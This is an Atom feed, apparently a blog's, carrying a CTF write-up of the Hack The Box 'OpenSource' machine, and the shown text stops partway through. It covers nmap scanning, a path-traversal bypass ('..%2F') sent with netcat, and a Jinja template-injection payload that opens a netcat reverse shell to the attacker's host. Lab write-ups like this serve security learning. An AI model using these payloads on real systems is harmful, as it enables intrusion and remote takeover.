@@ -1,0 +1,380 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title> - htb</title>
+	<link href="https://drbh.github.io/writeups/categories/htb/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="https://drbh.github.io/writeups/"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2022-05-30T00:00:00+00:00</updated>
+	<id>https://drbh.github.io/writeups/categories/htb/atom.xml</id>
+	<entry xml:lang="en">
+		<title>First HTB ⛳️: OpenSource</title>
+		<published>2022-05-30T00:00:00+00:00</published>
+		<updated>2022-05-30T00:00:00+00:00</updated>
+		<link href="https://drbh.github.io/writeups/some-article/" type="text/html"/>
+		<id>https://drbh.github.io/writeups/some-article/</id>
+		<content type="html">&lt;p&gt;This weekend I hacked my way through my first Hack The Box CTF. This was an exciting&#x2F;frustrating and enlightening experience. &lt;&#x2F;p&gt;
+&lt;p&gt;This writeup chronicles how I hacked the box and some of the interesting things I learned on the way.&lt;&#x2F;p&gt;
+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h1 id=&quot;the-journey&quot;&gt;The Journey&lt;&#x2F;h1&gt;
+&lt;p&gt;The &lt;a href=&quot;https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&quot;&gt;OpenSource machine&lt;&#x2F;a&gt; was my first HTB CTF, and I had a great time hacking away and capturing the flags.&lt;&#x2F;p&gt;
+&lt;p&gt;This machine is named open source because the exploit revolves around an open-source web app that has some serious but subtle bugs.&lt;&#x2F;p&gt;
+&lt;p&gt;I was especially excited to get started on this challenge since it is focused on software development, and I&#x27;m coming to the pen testing world as a software engineer.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;discovery&quot;&gt;Discovery&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Scan ports&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;First we run a port scan on the box to see what services are running. &lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;➜&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; sudo nmap&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -sS -A&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; 10.10.11.164
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-05-24 22:37 EDT
+Nmap scan report for 10.10.11.164
+Host is up (0.0097s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE    SERVICE VERSION
+22&#x2F;tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+80&#x2F;tcp   open     http    Werkzeug&#x2F;2.1.2 Python&#x2F;3.10.3
+3000&#x2F;tcp filtered ppp
+...
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;We know that port 22 is &lt;code&gt;ssh&lt;&#x2F;code&gt;, 3000 is some service that looks like it&#x27;s running but has some IP rules protecting it. Lastly we have port 80 running the custom web app.&lt;&#x2F;p&gt;
+&lt;p&gt;We&#x27;ll be taking at look at ports &lt;code&gt;80&lt;&#x2F;code&gt; first and &lt;code&gt;3000&lt;&#x2F;code&gt; later since it&#x27;s filtered.&lt;&#x2F;p&gt;
+&lt;p&gt;Note:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;we have 2 open ports, ssh and http&lt;&#x2F;li&gt;
+&lt;li&gt;1 filtered (probably IP rules on the box)&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;&lt;strong&gt;Explore source code structure&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We can navigate to the IP in our browser to see what the site looks like.&lt;&#x2F;p&gt;
+&lt;p&gt;At the bottom of the page we are given a link to the source. Which we can see the file structure of below.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;➜&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; tree .&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -L&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; 3
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; .git
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     ├── ...
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     └── refs
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; Dockerfile
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; app
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     ├── INSTALL.md
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     ├── app
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     │     ├── __init__.py
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     │     ├── __pycache__
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     │     ├── configuration.py
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     │     ├── static
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     │     ├── templates
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     │     ├── utils.py
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     │     └── views.py
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     ├── public
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     │     └── uploads
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     ├── requests
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     │     ├── code-execution
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     │     └── update-index
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;│&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;     └── run.py
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; build-docker.sh
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;└──&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; config
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;└──&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; supervisord.conf
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; directories, 11 files
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Note:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;It&#x27;s a git repo&lt;&#x2F;li&gt;
+&lt;li&gt;It&#x27;s using a &lt;code&gt;docker&lt;&#x2F;code&gt; container&lt;&#x2F;li&gt;
+&lt;li&gt;It&#x27;s using &lt;code&gt;supervisord&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;&lt;strong&gt;Explore source code contents&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;em&gt;snippet from views.py&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;@app.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;route&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;upcloud&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;methods&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;=[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;GET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;POST&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;])
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;upload_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;():
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;request.method == &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;POST&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;:
+        f = request.files[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;]
+        file_name = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get_file_name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(f.filename)
+        file_path = os.path.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(os.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getcwd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(), &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;uploads&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;, file_name)
+        f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;save&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(file_path)
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;render_template&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;success.html&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;file_url&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;=request.host_url + &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;uploads&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot; + file_name)
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;render_template&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;upload.html&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;)
+
+
+@app.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;route&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;uploads&#x2F;&amp;lt;path:path&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;send_report&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;path&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;):
+    path = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get_file_name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(path)
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(os.path.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(os.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getcwd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(), &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;uploads&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;, path))
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Inside of the &lt;code&gt;app&#x2F;views.py&lt;&#x2F;code&gt; file we can see that the code makes relative path calls using user input.&lt;&#x2F;p&gt;
+&lt;p&gt;This looks like a good way for us to access more data ont the box. Or possibly a way to place a file in a favorable location.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Examine validation logic&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Inside of &lt;code&gt;app&#x2F;utils.py&lt;&#x2F;code&gt; can see that there&#x27;s some custom written validation logic that removes any &lt;code&gt;..&#x2F;&lt;&#x2F;code&gt; (dot dot slash).&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;get_file_name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;unsafe_filename&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;):
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;recursive_replace&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(unsafe_filename, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;..&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;, &amp;quot;&amp;quot;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;recursive_replace&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;search&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace_me&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;with_me&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;):
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;replace_me not in search:
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;search
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;recursive_replace&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(search.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(replace_me, with_me), replace_me, with_me)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Note:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;written recursively which makes it hard to trick&lt;&#x2F;li&gt;
+&lt;li&gt;can&#x27;t use &lt;code&gt;..&#x2F;&lt;&#x2F;code&gt; &lt;&#x2F;li&gt;
+&lt;li&gt;maybe &lt;code&gt;&#x2F;&#x2F;&lt;&#x2F;code&gt; (directly navigate to root)?&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;&lt;strong&gt;Testing entrypoint&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We can craft a request to send that should upload a file to an unexpected directory&lt;&#x2F;p&gt;
+&lt;p&gt;First lets craft a new file called &lt;code&gt;prove.http&lt;&#x2F;code&gt;. &lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;GET &#x2F;uploads&#x2F;..%2F&#x2F;app&#x2F;run.py HTTP&#x2F;1.1
+Connection: close
+
+
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This file contains a simple GET request that attampts to exploit the uploads file to include a file we know exists (from the open source) in a directory above the expected one.&lt;&#x2F;p&gt;
+&lt;p&gt;Send it with netcat&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt; 10.10.11.164 80 &amp;lt; prove.http
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Response&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;HTTP&#x2F;1.1 200 OK
+Server: Werkzeug&#x2F;2.1.2 Python&#x2F;3.10.3
+Date: Tue, 31 May 2022 04:45:51 GMT
+Content-Disposition: inline; filename=run.py
+Content-Type: text&#x2F;x-python; charset=utf-8
+Content-Length: 141
+Last-Modified: Wed, 23 Mar 2022 00:33:44 GMT
+Cache-Control: no-cache
+ETag: &amp;quot;1647995624.0-141-388170764&amp;quot;
+Date: Tue, 31 May 2022 04:45:51 GMT
+Connection: close
+
+import os
+
+from app import app
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    port = int(os.environ.get(&amp;quot;PORT&amp;quot;, 80))
+    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=port)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;🙌 woo thats a great response. We can see that the server runs the contents of a python file.&lt;&#x2F;p&gt;
+&lt;p&gt;Next lets use this exploit to escalate our access. Our goal is to open a reverse shell on the box.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;foothold&quot;&gt;Foothold&lt;&#x2F;h2&gt;
+&lt;p&gt;Now that we have a viable attack vector we want to use it to give us remote code execution.&lt;&#x2F;p&gt;
+&lt;p&gt;From our discovery we know that we can write files, but it&#x27;s unclear which file we should upload.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Exploit relative path&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;If we look into the source code further we can see that there are &lt;code&gt;template&lt;&#x2F;code&gt; files. These seem to be HTML with a templating languge. &lt;&#x2F;p&gt;
+&lt;p&gt;For example this is a snippet from the &lt;code&gt;templates&#x2F;success.html&lt;&#x2F;code&gt; file that shows the double curly bracket notation. &lt;&#x2F;p&gt;
+&lt;p&gt;The double curly brackets is from the &lt;code&gt;jinja&lt;&#x2F;code&gt; template libray, and should allow us to limited execution.&lt;&#x2F;p&gt;
+&lt;p&gt;We can do some execution like &lt;code&gt;{{ 2+2 }}&lt;&#x2F;code&gt; which would resolve as &lt;code&gt;{{ 4 }}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;gt;Your &amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;style&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;=&amp;quot;text-decoration: none;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;href&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;{{ file_url }}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;&amp;gt;file&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;gt; has been uploaded.&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Instead of writing new files, we can overwrite the template files and exploit the jinja injection notation to execute remote code.&lt;&#x2F;p&gt;
+&lt;p&gt;With a quick google, thanks to Podalirius&#x27; &lt;a href=&quot;https:&#x2F;&#x2F;podalirius.net&#x2F;en&#x2F;articles&#x2F;python-vulnerabilities-code-execution-in-jinja-templates&#x2F;&quot;&gt;article&lt;&#x2F;a&gt; we can also see that it&#x27;s shouldnt be hard to esclate to arbitrary code execution if we can access the shell.&lt;&#x2F;p&gt;
+&lt;p&gt;Essentally we want to write something like this&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;.__globals__
+  .__builtins__
+  .__import__(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;os&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;)
+  .system(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;id&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;but with a reverse shell payload, so we want:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__
+  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;.__globals__
+  .__builtins__
+  .__import__(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;os&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;)
+  .system(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;nc 10.10.14.7 4444 -e &#x2F;bin&#x2F;sh&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;#39;)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;Reverse shell&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We can craft a HTTP request using this payload and lets just completely replace the root page on the server.&lt;&#x2F;p&gt;
